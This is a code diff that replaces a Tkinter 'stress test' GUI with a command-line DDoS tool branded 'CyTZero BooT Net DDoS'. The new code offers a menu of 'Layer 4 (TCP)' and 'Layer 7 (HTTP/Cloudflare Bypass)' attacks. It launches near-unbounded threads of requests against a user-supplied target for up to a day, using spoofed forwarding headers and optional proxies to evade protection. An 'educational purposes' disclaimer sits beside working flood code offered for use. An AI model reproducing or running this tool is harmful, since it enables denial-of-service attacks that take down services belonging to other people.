@@ -1,148 +1,184 @@
+import socket
 import threading
-import requests
 import time
-from tkinter import Tk, Frame, Label, Entry, Button, ttk
-from tkinter import messagebox
+import requests
+from colorama import init, Fore, Style
+import sys
 import random
-from tkinter import Canvas
 
-class StressTestApp:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("Stress Test Tool")
-        self.running = False
+init()
 
-        # Configurarea interfeței
-        self.create_widgets()
+def print_ascii_art():
+    art = f"""
+{Fore.RED}
+                        )                                              )               (     (                
+   (          *   )  ( /(                    (              *   )   ( /(           )   )\ )  )\ )              
+   )\  (     )  /(  )\())  (   (          ( )\            )  /(   )\())   (   ( /(  (()/( (()/(              
+ (((_) )\ )  ( )(_))((_)\  ))\  )(    (    )((_)  (    (   ( )(_)) ((_)\   ))\  )\())  /(_)) /(_))   (   (    
+ )\___(()/( (_(_())  _((_)/((_)(()\   )\  ((_)_   )\   )\ (_(_())   _((_) /((_)(_))/  (_))_ (_))_    )\  )\   
+((/ __|)(_))|_   _| |_  /(_))   ((_) ((_)  | _ ) ((_) ((_)|_   _|  | \| |(_))  | |_    |   \ |   \  ((_)((_)  
+ | (__| || |  | |    / / / -_) | '_|/ _ \  | _ \/ _ \/ _ \  | |    | . |/ -_) |  _|   | |) || |) |/ _ \(_-<  
+  \___|\_, |  |_|   /___|\___| |_|  \___/  |___/\___/\___/  |_|    |_|\_|\___|  \__|   |___/ |___/ \___//__/  
+       |__/                                                                                                  
+                                        Code By CyTZero
+                                  BooT Net DDoS    
+{Style.RESET_ALL}
+    """
+    print(art)
 
-    def create_widgets(self):
-        # Secțiunea de configurare
-        config_frame = Frame(self.root, padx=10, pady=10, bg="black")
-        config_frame.pack(fill="x")
+def print_disclaimer():
+    disclaimer = """
+DISCLAIMER:
+This script is intended for educational purposes and responsible testing only.
+Using this script to perform unauthorized actions, such as a Distributed Denial of Service (DDoS) attack or any other malicious activity, is illegal and unethical. Ensure that you have explicit permission from the server owner before performing any tests.
 
-        Label(config_frame, text="Target URL/IP:", fg="red", bg="black").grid(row=0, column=0, sticky="w")
-        self.target_entry = Entry(config_frame, width=30, bg="black", fg="white", insertbackground="white")
-        self.target_entry.grid(row=0, column=1, pady=5)
+The author of this script accepts no responsibility for any misuse or damage caused by the use of this script. Use it at your own risk and comply with all relevant laws and regulations.
+"""
+    print(disclaimer)
 
-        Label(config_frame, text="Threads:", fg="red", bg="black").grid(row=1, column=0, sticky="w")
-        self.threads_entry = Entry(config_frame, width=10, bg="black", fg="white", insertbackground="white")
-        self.threads_entry.grid(row=1, column=1, pady=5, sticky="w")
+def loading_animation(duration=5):
+    end_time = time.time() + duration
+    spinner = ['|', '/', '-', '\\']
+    while time.time() < end_time:
+        for symbol in spinner:
+            sys.stdout.write(f'\rAttack in progress... {symbol}')
+            sys.stdout.flush()
+            time.sleep(0.1)
+    sys.stdout.write('\rLaunch Attack......      \n')
+    sys.stdout.flush()
 
-        Label(config_frame, text="Duration (s):", fg="red", bg="black").grid(row=2, column=0, sticky="w")
-        self.duration_entry = Entry(config_frame, width=10, bg="black", fg="white", insertbackground="white")
-        self.duration_entry.grid(row=2, column=1, pady=5, sticky="w")
+def send_tcp_request(host, port, request_id):
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(5)
+            s.connect((host, port))
+            # Trimitem un payload mai mare pentru un impact mai mare
+            payload = b'X' * 1024  # 1KB de date
+            s.sendall(payload)
+            response = s.recv(1024)
+            print(f"{Fore.GREEN}[{request_id}] TCP request successful to {host}:{port}{Style.RESET_ALL}")
+    except socket.error as e:
+        print(f"{Fore.RED}[{request_id}] TCP request failed to {host}:{port}: {e}{Style.RESET_ALL}")
 
-        self.start_button = Button(config_frame, text="Start Test", command=self.start_test, bg="darkred", fg="white")
-        self.start_button.grid(row=3, column=0, pady=10, sticky="w")
+def bypass_cloudflare(url):
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Cache-Control': 'max-age=0',
+            'X-Forwarded-For': f'{".".join(map(str, [random.randint(1, 255) for _ in range(4)]))}',
+            'X-Real-IP': f'{".".join(map(str, [random.randint(1, 255) for _ in range(4)]))}',
+        }
+        return headers
+    except Exception as e:
+        print(f"{Fore.RED}Error generating Cloudflare bypass headers: {e}{Style.RESET_ALL}")
+        return {}
 
-        self.stop_button = Button(config_frame, text="Stop Test", command=self.stop_test, bg="red", fg="white")
-        self.stop_button.grid(row=3, column=1, pady=10, sticky="w")
+def send_http_request(url, request_id, proxies=None):
+    try:
+        headers = bypass_cloudflare(url)
+        response = requests.get(url, timeout=5, proxies=proxies, headers=headers)
+        if response.status_code == 200:
+            print(f"{Fore.GREEN}[{request_id}] HTTP request to {url} responded with status code: {response.status_code} (Bypass Success){Style.RESET_ALL}")
+        elif response.status_code == 503:
+            print(f"{Fore.RED}[{request_id}] HTTP request to {url} responded with status code: {response.status_code} (Cloudflare Detected){Style.RESET_ALL}")
+        else:
+            print(f"[{request_id}] HTTP request to {url} responded with status code: {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"[{request_id}] HTTP request to {url} failed: {e}")
 
-        # Secțiunea tabelului
-        self.tree = ttk.Treeview(self.root, columns=("#1", "#2"), show="headings", height=10)
-        self.tree.heading("#1", text="Target")
-        self.tree.heading("#2", text="Status")
-        self.tree.pack(fill="x", padx=10, pady=10)
-
-        # Personalizare stil tabel
-        style = ttk.Style()
-        style.configure("Treeview", background="black", foreground="white", fieldbackground="black", rowheight=25)
-        style.map("Treeview", background=[("selected", "red")])
-
-        # Secțiunea graficului
-        self.canvas = Canvas(self.root, width=500, height=300, bg="black", highlightthickness=0)
-        self.canvas.pack(fill="both", expand=True)
-        self.success_count = 0
-        self.error_count = 0
-
-    def send_request(self, target):
-        try:
-            if not target.startswith("http"):
-                target = f"http://{target}"
-            response = requests.get(target, timeout=5)
-            self.update_table(target, f"Success ({response.status_code})")
-            self.success_count += 1
-        except requests.exceptions.RequestException as e:
-            self.update_table(target, f"Error ({str(e)})")
-            self.error_count += 1
-
-        self.update_graph()
-
-    def update_table(self, target, status):
-        self.tree.insert("", "end", values=(target, status))
-
-    def update_graph(self):
-        self.canvas.delete("all")
-        total = self.success_count + self.error_count
-        if total > 0:
-            success_height = (self.success_count / total) * 300
-            error_height = (self.error_count / total) * 300
-
-            # Bar for success
-            self.animate_bar(100, 300 - success_height, 200, 300, fill="darkgreen", outline="white", label=f"Success: {self.success_count}", label_color="white")
-
-            # Bar for error
-            self.animate_bar(300, 300 - error_height, 400, 300, fill="darkred", outline="white", label=f"Error: {self.error_count}", label_color="white")
-
-    def animate_bar(self, x1, y1, x2, y2, fill, outline, label, label_color):
-        current_height = 300
-        target_height = y1
-        steps = 20
-        delta = (current_height - target_height) / steps
-
-        for i in range(steps):
-            self.canvas.delete("bar")
-            self.canvas.create_rectangle(x1, current_height - delta * (i + 1), x2, 300, fill=fill, outline=outline, tags="bar")
-            self.canvas.update()
-            time.sleep(0.02)
-
-        self.canvas.create_text((x1 + x2) / 2, target_height - 10, text=label, fill=label_color, font=("Arial", 12, "bold"))
-
-    def stress_test(self, target, num_threads, duration):
-        start_time = time.time()
+def send_multiple_tcp_requests(host, port, num_requests, duration=86400):
+    total_requests = num_requests * 999999
+    start_time = time.time()
+    while time.time() - start_time < duration:
         threads = []
-        while self.running and (time.time() - start_time) < duration:
-            for _ in range(num_threads):
-                if not self.running:
-                    break
-                thread = threading.Thread(target=self.send_request, args=(target,))
-                thread.start()
-                threads.append(thread)
-            time.sleep(0.05)
-
+        for i in range(total_requests):
+            thread = threading.Thread(target=send_tcp_request, args=(host, port, i + 1))
+            threads.append(thread)
+            thread.start()
+            time.sleep(0.001)  # Mic delay pentru a evita supraîncărcarea
         for thread in threads:
             thread.join()
 
-    def start_test(self):
-        target = self.target_entry.get().strip()
-        try:
-            num_threads = int(self.threads_entry.get().strip())
-            duration = int(self.duration_entry.get().strip())
-        except ValueError:
-            messagebox.showerror("Invalid Input", "Please enter valid numbers for threads and duration.")
-            return
+def send_multiple_http_requests(url, num_requests, duration=86400, proxies=None):
+    total_requests = num_requests * 999999  
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        threads = []
+        for i in range(total_requests):
+            thread = threading.Thread(target=send_http_request, args=(url, i + 1, proxies))
+            threads.append(thread)
+            thread.start()
+            time.sleep(0.00) 
+        for thread in threads:
+            thread.join() 
 
-        if not target:
-            messagebox.showerror("Invalid Input", "Please enter a target URL or IP.")
-            return
-
-        self.running = True
-        threading.Thread(target=self.stress_test, args=(target, num_threads, duration), daemon=True).start()
-
-    def stop_test(self):
-        self.running = False
-
-if __name__ == "__main__":
-    root = Tk()
-    app = StressTestApp(root)
-
-    # Add dramatic flicker effect to the window
-    def flicker_effect():
-        colors = ["#400000", "#800000", "#000000"]
-        while True:
-            color = random.choice(colors)
-            root.configure(bg=color)
+def animation_loop(message):
+    while True:
+        for symbol in ['-', '\\', '|', '/']:
+            sys.stdout.write(f'\r{message} {symbol}')
+            sys.stdout.flush()
             time.sleep(0.1)
 
-    threading.Thread(target=flicker_effect, daemon=True).start()
-    root.mainloop()
+if __name__ == "__main__":
+    print_ascii_art()
+    print_disclaimer()
+    
+    while True:
+        print(f"\n{Fore.CYAN}=== MENU ===")
+        print(f"{Fore.GREEN}1. Layer 4 (TCP) Attack")
+        print(f"2. Layer 7 (HTTP/Cloudflare Bypass) Attack")
+        print(f"3. Exit{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}============{Style.RESET_ALL}\n")
+        
+        choice = input(f"{Fore.YELLOW}Select your option (1-3): {Style.RESET_ALL}")
+        
+        if choice == '1':
+            host = input(f"{Fore.GREEN}Target IP/Hostname: {Style.RESET_ALL}")
+            port = int(input(f"{Fore.GREEN}Target Port (default 80): {Style.RESET_ALL}") or "80")
+            num_requests = int(input(f"{Fore.GREEN}Base number of requests: {Style.RESET_ALL}"))
+            
+            if num_requests <= 0:
+                print(f"{Fore.RED}Number of requests must be positive.{Style.RESET_ALL}")
+                continue
+                
+            print(f"\n{Fore.YELLOW}Starting Layer 4 attack...{Style.RESET_ALL}\n")
+            loading_animation()
+            try:
+                threading.Thread(target=send_multiple_tcp_requests, args=(host, port, num_requests)).start()
+                animation_loop("Sending TCP requests...")
+            except KeyboardInterrupt:
+                print(f"\n{Fore.RED}Layer 4 attack stopped by user.{Style.RESET_ALL}")
+                
+        elif choice == '2':
+            url = input("Target URL: ")
+            num_requests = int(input("Base number of requests: "))
+            use_proxies = input("Use proxy? (y/n): ").strip().lower()
+            proxies = None
+            if use_proxies == 'y':
+                proxy = input("Enter proxy (e.g., http://username:password@proxyserver:port): ")
+                proxies = {
+                    'http': proxy,
+                    'https': proxy,
+                }
+            if num_requests <= 0:
+                print("Number of requests must be positive.")
+            else:
+                print("Starting Layer 7 test...\n")
+                loading_animation()
+                try:
+                    threading.Thread(target=send_multiple_http_requests, args=(url, num_requests, 86400, proxies)).start()
+                    animation_loop("Sending HTTP requests...")
+                except KeyboardInterrupt:
+                    print("\nLayer 7 testing stopped by user.")
+                
+        elif choice == '3':
+            print(f"\n{Fore.YELLOW}Exiting program...{Style.RESET_ALL}")
+            break
+            
+        else:
+            print(f"{Fore.RED}Invalid option. Please choose 1, 2, or 3.{Style.RESET_ALL}") 
